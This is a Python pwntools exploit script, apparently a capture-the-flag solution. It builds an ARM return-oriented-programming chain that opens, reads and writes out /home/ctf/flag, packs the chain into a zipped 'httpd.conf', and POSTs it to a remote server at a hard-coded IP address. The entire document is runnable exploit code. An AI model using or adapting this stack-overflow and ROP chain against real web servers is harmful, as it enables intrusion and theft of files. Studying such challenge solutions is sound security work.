#! /usr/bin/env python

import subprocess
import binascii
from pwn import *

_deadbeef = 0xdeadbeef
_open_scv_val = 0x5
_read_scv_val = 0x3
_write_scv_val = 0x4
_two_val = 0x2
_len_val = 0x30
_one_val = 0x1
_zero_val = 0x0
_flag = 0x000bbd7f

_set_r1 = 0x000849ec # pop {r1, pc}
_set_r0 = 0x00084574 # pop {r0, pc}
_run_svc = 0x00039adc # svc #0 ; pop {r4, r5, r6, r7, r8, pc}
_set_r7 = 0x000312cc # pop {r7, pc}
_set_r3 = 0x00010160 # pop {r3, pc}
_set_lr = 0x0003b490 # pop {lr} ; bx r3
_set_r2_r3 = 0x0008495c # pop {r2, r3} ; bx lr

def build_exploit():
	pwn = p32(0x00084574) * (550 / 4)
	pwn += p32(_set_r3)
	pwn += p32(_set_r0)
	pwn += p32(_set_lr)
	pwn += p32(_set_r0)
	pwn += p32(_zero_val)
	pwn += p32(_set_r2_r3)
	pwn += p32(_zero_val)
	pwn += p32(_zero_val)
	pwn += p32(_flag)
	pwn += p32(_set_r1)
	pwn += p32(_zero_val)
	pwn += p32(_set_r7)
	pwn += p32(_open_scv_val)
	pwn += p32(_run_svc)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_set_r3)
	pwn += p32(_set_r2_r3)
	pwn += p32(_set_lr)
	pwn += p32(_set_r7)
	pwn += p32(_len_val)
	pwn += p32(_len_val)
	pwn += p32(_read_scv_val)
	pwn += p32(_set_r1)
	pwn += p32(_flag)
	pwn += p32(_run_svc)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_deadbeef)
	pwn += p32(_set_r0)
	pwn += p32(_one_val)
	pwn += p32(_set_r7)
	pwn += p32(_write_scv_val)
	pwn += p32(_run_svc)

	with open('httpd.conf', 'wb') as f:
		f.write(pwn)

	p = subprocess.Popen(["zip", "expl.zip", "httpd.conf"])
	p.wait()

	with open("expl.zip", "rb") as f:
		zip_file = f.read()

	return zip_file


zip_file = build_exploit()
r = remote('34.254.34.57', 5555)
pwnlib.ui.pause()

payload = 	"POST /page?=conf \r\n/home/ctf/flag\x00" \
			"Content-Type: application/zip\r\n\r\n" \
			"{0}".format(zip_file)

r.send(payload)
r.interactive()
